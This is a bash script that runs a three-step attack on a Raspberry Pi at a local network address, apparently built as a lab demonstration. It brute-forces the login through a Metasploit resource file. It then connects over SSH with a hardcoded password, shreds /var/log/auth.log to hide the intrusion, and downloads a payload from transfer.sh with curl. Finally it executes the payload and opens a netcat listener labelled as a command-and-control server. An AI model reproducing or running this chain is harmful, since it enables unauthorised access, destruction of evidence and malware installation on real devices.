#!/bin/bash
#STEP 1: Bruteforce attack to gain access to device
echo "###################################################################"
echo "STEP 1: Gain Access To Device"
echo "###################################################################"
echo "###################################################################"
echo "		Brute Force Password Guessing"
echo "###################################################################"

msfconsole -r passwordGuessing.rc

#STEP 2: Inspected malware in to the device
read -n1 -rsp $'Press [ENTER] to continue exploit the device...\n' key
if [ "$key" = '' ]; then
	echo "###################################################################"
        echo "STEP 2: Inspecting device with malware"
        echo "###################################################################"
	sshpass -p "PhongLee1210" ssh  pi@192.168.1.232 << EOF
	echo "###################################################################"
        echo "		Remove System Log"
        echo "###################################################################"
	sudo shred -vfzu /var/log/auth.log
	echo "###################################################################"
	echo "		Dowloading PAYLOAD..."
	echo "###################################################################"
	curl https://transfer.sh/1bpKIp1/Malware.txt -o ~/Desktop/Malware.txt 
EOF
#STEP 3: Connect device to CnC Server
	read -n1 -rsp $'\033[0mPress [ENTER] to continue exploit the device...\n' key
	if [ "$key" = '' ]; then
		echo "###################################################################"
       		echo "STEP 3: Connecting Device To CnC Server"
        	echo "###################################################################"
		echo "###################################################################"
                echo "		Running PAYLOAD and Infecting device"
                echo "###################################################################"
		sshpass -p "PhongLee1210" ssh pi@192.168.1.232 'sudo chmod +x ~/Desktop/Malware.txt; ./Desktop/Malware.txt'
		echo "###################################################################"
	        echo "		Establishing connect to CnC Server"
        	echo "###################################################################"
		nc -lnvp 6969 

	else
		echo "FAILED!!!"
	fi
else
    # Anything else pressed, do whatever else.
	echo "BYEEEEEEE"
fi
